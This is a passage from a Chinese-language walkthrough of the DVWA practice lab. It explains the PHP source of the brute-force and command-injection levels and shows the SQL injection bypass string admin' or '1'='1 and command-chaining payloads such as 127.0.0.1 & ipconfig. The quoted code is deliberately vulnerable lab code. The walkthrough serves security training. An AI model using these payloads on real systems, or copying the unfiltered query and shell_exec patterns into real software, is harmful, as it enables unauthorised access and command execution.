class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// 未查到登录失败，输出错误信息到页面</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><span class="hljs-comment">//释放资源</span><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>经过源码分析我们发现后台直接将输入的用户名拼接到sql中查询，<em>也没有对密码和用户名进行校验</em>，我们可以构造恶意语句<code>admin&#39; or &#39;1&#39;=&#39;1</code>让后边条件为永真将数据库用户存入变量，使变量中有值，从而登录成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-13-45-56.png" alt="万能密码" class="lazyload"><br>可以使用burp进行暴破，操作如下：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-37-49.png" alt="low暴破" class="lazyload"></p>
<p><strong>medium难度下的暴力破解</strong><br>源码解析：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-44-12.png" alt="文件位置" class="lazyload"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//检测是否存在在Login变量</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// Sanitise username input 获取用户名存入user</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br> <span class="hljs-comment">//user中x00，n，r，，’，”，x1a转义，防SQL注入</span><br> <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br> <span class="hljs-comment">// 获取到密码 并转义 防sql注入</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br> <span class="hljs-comment">//密码md5加密</span><br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// Check the database</span><br> <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br> <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>  <span class="hljs-comment">// Get users details</span><br>  <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );<br>  <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>  <span class="hljs-comment">// Login successful</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Login failed</span><br>  sleep( <span class="hljs-number">2</span> );<span class="hljs-comment">//失败后会延时两秒</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>中等难度他的源码对于登录这方面没有做太多改动，因此他的暴破过程和low难度过程基本一样，只不过对一些字符使用mysql_real_escape_string这个函数进行了转义，有效防止了通过万能密钥注入的方式登录<br>操作和low一样<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-18-23-45.png" alt="medium难度暴力破解" class="lazyload"><br>防止万能密钥的登陆<code>admin&#39; or &#39;1&#39; = &#39;1</code>输入用户名为这个，再随便输密码显示登录失败<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-18-29-16.png" alt="万能密钥" class="lazyload"></p>
<p><strong>high难度下的暴力破解</strong><br>源码解析<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-41-49.png" alt="文件位置" class="lazyload"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// Check Anti-CSRF token</span><br> checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br> <span class="hljs-comment">// Sanitise username input</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br> <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );<br> <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br> <span class="hljs-comment">// Sanitise password input</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );<br> <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// Check database</span><br> <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br> <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>  <span class="hljs-comment">// Get users details</span><br>  <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );<br>  <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>  <span class="hljs-comment">// Login successful</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Login failed</span><br>  sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以明显的看出添加了token检验机制来增加暴破的难度，token在计算机身份认证中是令牌(临时)的意思，在词法分析中是标记的意思。一般作为邀请、登录系统使用。针对带token验证的防暴破机制我们可以使用burp来绕过。<br>演示：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-10-50-10.png" alt="带有token如何暴破" class="lazyload"></p>
<p><strong>impossible难度</strong><br>源码解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//这里使用post获取参数</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) ) &#123;<br> <span class="hljs-comment">// 怎加token检验</span><br> checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br> <span class="hljs-comment">// 过滤用户名</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br> <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );<br> <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br> <span class="hljs-comment">// 过滤密码并且md5加密密码</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );<br> <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// 失败登录三次锁定时间</span><br> <span class="hljs-variable">$total_failed_login</span> = <span class="hljs-number">3</span>;<br> <span class="hljs-variable">$lockout_time</span>       = <span class="hljs-number">15</span>;<br> <span class="hljs-variable">$account_locked</span>     = <span class="hljs-literal">false</span>;<br><br> <span class="hljs-comment">// 验证用户名</span><br> <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br> <span class="hljs-variable">$data</span>-&gt;execute();<br> <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;fetch();<br><br> <span class="hljs-comment">//检测账户是否被锁定 尝试大于三次锁定账户</span><br> <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="hljs-variable">$total_failed_login</span> ) )  &#123;<br>  <span class="hljs-comment">// User locked out.  Note, using this method would allow for user enumeration!</span><br>  <span class="hljs-comment">//$html .= &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><br>  <span class="hljs-comment">// 计算用户是否能重新登录</span><br>  <span class="hljs-variable">$last_login</span> = strtotime( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ] );<br>  <span class="hljs-variable">$timeout</span>    = <span class="hljs-variable">$last_login</span> + (<span class="hljs-variable">$lockout_time</span> * <span class="hljs-number">60</span>);<br>  <span class="hljs-variable">$timenow</span>    = time();<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">  print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">  print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-comment">// 检测所动账户时间是否够了并解锁账户</span><br>  <span class="hljs-keyword">if</span>( <span class="hljs-variable">$timenow</span> &lt; <span class="hljs-variable">$timeout</span> ) &#123;<br>   <span class="hljs-variable">$account_locked</span> = <span class="hljs-literal">true</span>;<br>   <span class="hljs-comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span><br>  &#125;<br> &#125;<br><br> <span class="hljs-comment">// 检测用户名和密码与数据库是否匹配</span><br> <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR);<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass</span>, PDO::PARAM_STR );<br> <span class="hljs-variable">$data</span>-&gt;execute();<br> <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;fetch();<br><br> <span class="hljs-comment">// 如果登录有效</span><br> <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$account_locked</span> == <span class="hljs-literal">false</span> ) ) &#123;<br>  <span class="hljs-comment">// 获取用户登录测试，头像和最近登录</span><br>  <span class="hljs-variable">$avatar</span>       = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;avatar&#x27;</span> ];<br>  <span class="hljs-variable">$failed_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ];<br>  <span class="hljs-variable">$last_login</span>   = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br><br>  <span class="hljs-comment">// 输出登录信息</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="hljs-subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br><br>  <span class="hljs-comment">// 自上次登录后账户是否已被锁定</span><br>  <span class="hljs-keyword">if</span>( <span class="hljs-variable">$failed_login</span> &gt;= <span class="hljs-variable">$total_failed_login</span> ) &#123;<br>   <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;<br>   <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="hljs-subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 重置登录失败次数</span><br>  <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>  <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br>  <span class="hljs-variable">$data</span>-&gt;execute();<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// 登录失败随机延时并且输出返回信息</span><br>  sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br><br>  <span class="hljs-comment">// 页面展示</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;<br><br>  <span class="hljs-comment">// 跟新登录失败次数</span><br>  <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>  <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br>  <span class="hljs-variable">$data</span>-&gt;execute();<br> &#125;<br><br> <span class="hljs-comment">// 设置最后登录时间到数据库</span><br> <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br> <span class="hljs-variable">$data</span>-&gt;execute();<br>&#125;<br><br><span class="hljs-comment">// 重新获取token到session</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个难度是最高的，基本不可能暴破，其中gat方式获取参数转变为post获取，加上了token校验机制，限制了登录次数，登录超过三次会被锁定等待15分钟，通过这几种方式有效的防止了暴力破解。</p>
<h2 id="DVWA-–-Command-Injection（命令注入）"><a href="#DVWA-–-Command-Injection（命令注入）" class="headerlink" title="DVWA – Command Injection（命令注入）"></a>DVWA – Command Injection（命令注入）</h2><p>Command Injection(命令注入)，就是指通过提交一些恶意构造的参数破环命令语句结构，从而达到恶意执行命令的目的。这里要和RCE漏洞进行区别，RCE漏洞是执行代码，而这里执行的是命令。<br>Command Injection主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-11-50-15.png" alt="命令注入" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// 获取输入</span><br> <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br> <span class="hljs-comment">// 确定操作系统并执行ping命令</span><br> <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>  <span class="hljs-comment">// Windows</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// *nix</span><br>  <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br> &#125;<br><br> <span class="hljs-comment">//返回结果到页面中</span><br> <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>通过代码分析可知服务器仅根据不同的操作系统执行了不同的命令并没有对传入的参数进行过滤<br>命令拼接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ping 127.0.0.1 &amp; ipconfig　　　　#先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig<br>ping 127.0.0.1 &amp;&amp; ipconfig　　  #先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig<br>ping 127.0.0.1 | ipconfig　　　　#不管127.0.0.1执行是否成功都会执行ipconfig<br>ping 127.0.0 || ipconfig　　　   #前面的命令要执行失败，才可以执行后面的命令<br></code></pre></td></tr></table></figure>

<p>在这里我们直接使用第一个拼接，由于后台写了ping 所以我们只需要构造payload<code>127.0.0.1 &amp; ipconfig</code>就好：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-01-11.png" alt="成功执行" class="lazyload"><br>可以看到成功回显出了我们拼接的ipconfig命令</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br> <span class="hljs-comment">// 获取输入</span><br> <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br> <span class="hljs-comment">// 设置命令黑名单其中有&amp;&amp;和;</span><br> <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>  <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br> );<br><br> <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br> <span class="hljs-comment">//调用将&amp;&amp;和;替换为空</span><br> <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br> <span class="hljs-comment">// Determine OS and execute the ping command.</span><br> <span 